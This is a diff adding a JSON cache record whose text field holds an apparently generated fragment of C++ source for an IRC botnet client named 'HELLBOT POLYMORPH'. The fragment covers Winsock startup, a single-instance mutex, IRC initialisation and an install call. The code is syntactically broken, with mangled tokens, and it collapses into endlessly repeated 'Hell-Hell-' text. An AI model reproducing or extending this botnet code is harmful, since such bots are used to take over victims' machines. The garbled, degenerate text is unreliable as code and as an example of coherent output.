@@ -1,0 +1,5 @@
+{
+  "cache_key": "87d0980d0d3b1f8e0dfa",
+  "provider_request_id": null,
+  "text": "Context: int CHELL::HELLMAIN(void) { WSADATA initSock; if (WSAStartup(MAKEWORD(2,2), &initSock)) { cout << \"Winsock startup error.\" << endl; exit(0); } CreateMutex(NULL, FALSE, \"H-E-L-L-B-O-T-P-O-L-Y-M-O-R-P-H\"); while (GetLastError) == ERROR_ALREADY_EXISTS) {(0); } botRunning = true; cIRC.Init); AddHoststrue; h-Hinstall.Styltrue); Hell-Hell-Hell-Hell-Hell-Hell-Hell-Hell-Hell-Hell-H"
+}
